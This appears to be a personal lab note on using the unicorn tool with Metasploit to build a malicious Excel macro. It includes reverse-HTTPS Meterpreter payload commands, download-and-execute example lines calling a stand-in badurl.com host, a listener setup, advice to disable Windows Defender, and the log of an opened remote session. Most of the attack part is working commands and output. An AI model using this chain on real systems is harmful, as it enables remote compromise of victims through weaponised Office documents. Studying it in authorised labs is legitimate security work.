## Pre-requisite - [[Macros]]

## Using unicorn tool

#### Checking the payload for creation
```python
┌──(hyok㉿kali)-[/opt/unicorn]
└─$ ./unicorn.py
Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443
PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe
PS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro
Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro
Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro
HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta
HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta
HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms
HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms
DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde
CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
Custom PS1 Example: python unicorn.py <path to ps1 file>
Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)
------------------------------------SNIP----------------------------------------
```

#### Payload creation 
```python
python unicorn.py windows/meterpreter/reverse_https 192.168.1.106 443 macro
```
- This creates a text file and a ".rc" file with the same name and on the same destination. 
![[unicor_output.png]]
- We run the command the shown by the unicorn to create a listener for our payload.
```python
msfconsole -r umicorn.rc
```

#### macro creation on excel
###### Step-1
![[step1_macro_creation.png]]

###### Step-2
![[step2_macro_creation.png]]

###### Step-3
![[step3_macro_creation.png]]
- The data that was paste above here is grabed from the file "powershell_attack.txt".
###### Step-4
![[step4_macro_creation.png]]
- If you are not able to save the file then you should disable "windows defender".
#### Enabling macro on excel
###### Step-1
![[Enabling_macro_step1.png]]

###### Step-2
![[Enabling_macro_step2.png]]

###### Step-3
![[Enabling_macro_step4.png]]

#### Opening the maclicious excel file(CSV file)
**Note** - If you are not able to open this file then kindly disable the "windows defender".
![[opening_CSV.png]]

###### You get a session
```python
msf6 exploit(multi/handler) > [*] https://192.168.1.7:443 handling request from 192.168.1.5; (UUID: byqezprj) Staging x86 payload (176732 bytes) ...
[*] Meterpreter session 1 opened (192.168.1.7:443 -> 192.168.1.5:60055) at 2023-04-20 14:41:50 +0530

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information  Connection
  --  ----  ----                     -----------  ----------
  1         meterpreter x86/windows               192.168.1.7:443 -> 192.168.1.5:60055 (192.168.1.5)
```

# Note
- If you can't get a session after opening the "macro enabled excel file" then you should change "Sub AutoOpen()" to "Sub Auto_Open()" in the macro code.